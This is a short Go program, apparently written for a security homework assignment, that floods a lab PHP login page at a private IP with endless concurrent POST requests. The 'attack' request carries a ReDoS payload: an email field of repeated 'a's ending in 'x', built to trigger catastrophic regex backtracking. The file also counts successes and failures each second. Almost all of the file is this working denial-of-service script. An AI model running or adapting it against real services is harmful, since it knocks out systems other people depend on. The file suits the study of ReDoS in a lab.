package _go

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"sync"
	"time"
)

var wg sync.WaitGroup
var mutex sync.Mutex
var totalRequestNum int64
var totalRequestTime float64

type Reporter struct {
	mtx       sync.RWMutex
	succCount int
	failCount int
}

func (reporter *Reporter) IncrSucc() {
	reporter.mtx.Lock()
	defer reporter.mtx.Unlock()
	reporter.succCount = reporter.succCount + 1
}

func (reporter *Reporter) IncrFail() {
	reporter.mtx.Lock()
	defer reporter.mtx.Unlock()
	reporter.failCount = reporter.failCount + 1
}

func (reporter *Reporter) Get() {
	reporter.mtx.RLock()
	defer reporter.mtx.RUnlock()
	fmt.Printf("Get Success: %d, Failure: %d at %v\n", reporter.succCount, reporter.failCount, time.Now())
}

func main() {
	reporter := &Reporter{}
	requestUrl := "http://10.0.2.6/Homework3/final/index.php"
	//requestUrl := "http://10.0.2.131/Homework3/redos/index.php"
	concurrentRequester := 50
	go func() {
		for {
			reporter.Get()
			time.Sleep(time.Second)
		}
	}()
	wg.Add(1)
	for i := 0; i < concurrentRequester; i++ {
		go func(requestUrl string) {
			defer wg.Done()
			for {
				//makeNormalRequest(requestUrl, reporter)
				makeAttackRequest(requestUrl, reporter)
			}
		}(requestUrl)
	}
	wg.Wait()
	fmt.Println("done")
}

func makeAttackRequest(requestUrl string, rp *Reporter) {
	formValue := url.Values{
		"email":    {"aaaaaaaaaaaaaaaaaaaaaaaax"},
		"password": {"aaaaaaaaa"},
	}
	response, err := http.PostForm(requestUrl, formValue)
	if err != nil {
		go rp.IncrFail()
	} else {
		defer response.Body.Close()
		ioutil.ReadAll(response.Body)
		go rp.IncrSucc()
	}
}

func makeNormalRequest(requestUrl string, rp *Reporter) {
	formValue := url.Values{
		"email":    {"aaaaaaaaaaaaaaaaaaaaaaaaa"},
		"password": {"aaaaaaaaa"},
	}
	response, err := http.PostForm(requestUrl, formValue)
	if err != nil {
		go rp.IncrFail()
	} else {
		defer response.Body.Close()
		ioutil.ReadAll(response.Body)
		go rp.IncrSucc()
	}
}
